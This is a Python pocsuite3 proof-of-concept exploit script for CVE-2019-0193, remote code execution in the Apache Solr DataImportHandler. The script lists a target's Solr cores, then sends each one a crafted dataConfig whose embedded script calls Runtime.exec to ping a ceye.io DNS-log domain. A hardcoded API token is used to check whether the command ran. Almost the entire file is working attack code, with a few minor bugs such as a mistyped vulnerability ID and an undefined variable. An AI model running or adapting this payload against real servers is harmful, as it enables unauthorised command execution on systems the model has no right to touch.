#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import subprocess
import signal
import os
import sys
import base64
import re
from string import ascii_letters
import traceback

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
CVE-2019-0193
'''
class Solr_RCE_0193(POCBase):
    vulID = 'solr-CVE-2019-1093'
    appName = 'Solr'
    appVersion = 'Apache Solr < 8.2.0'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-08-01'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-08-11'  # 编写 PoC 的日期
    updateDate = '2020-05-21'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.openwall.com/lists/oss-security/2019/08/01/1']  # 漏洞地址来源,0day不用写
    name = 'Solr DataImportHandler远程代码执行漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)


    def _verify(self):
        result={}

        vul_url = self.url
        
        url_cores = vul_url + "/solr/admin/cores?wt=json"

        payload = '''command=full-import&dataConfig=
        <dataConfig>
            <dataSource type="URLDataSource"/>
                <script><![CDATA[ java.lang.Runtime.getRuntime().exec("ping {0}.{1}"); 
                ]]></script>
            <document>
                <entity name="a"
                    url="https://stackoverflow.com/feeds"
                    processor="XPathEntityProcessor"
                    forEach="/feed"
                    transformer="script:" />
            </document>
        </dataConfig>'''.format(self.BANNER, self.DOMAIN)


        core_names = self.get_core_names(url_cores)
        print(core_names)

        # 对每个core都发送一次请求
        for core_name in core_names:
            dataimport_url = '{0}/solr/{1}/dataimport'.format(self.url, core_name)
            target_url = dataimport_url
    
            url3 = target_url + "?" + payload
            
            try:
                req.get(url3)    # 利用。也可以用POST
                #req.post(url2, data=payload, proxies={'http': 'http://127.0.0.1:8087'})
            except Exception as e:
                print(e)
                continue
            
            time.sleep(2) # 休眠2s等待ceye生成记录
            if self.test_dnslog(self.CEYE_URL):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['core'] = core_name
                result['VerifyInfo']['Payload'] = payload
                return self.save_output(result)
        
        return self.save_output(result)


    ''' 拿到core的名字'''
    def get_core_name(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a[0]


    ''' 拿到所有core的名字'''
    def get_core_names(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            sub_domain = d['data'][0]['domain']
            if self.BANNER in sub_domain:
                print(sub_domain)
                return True
        except Exception:
            return False       


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register_poc(Solr_RCE_0193)
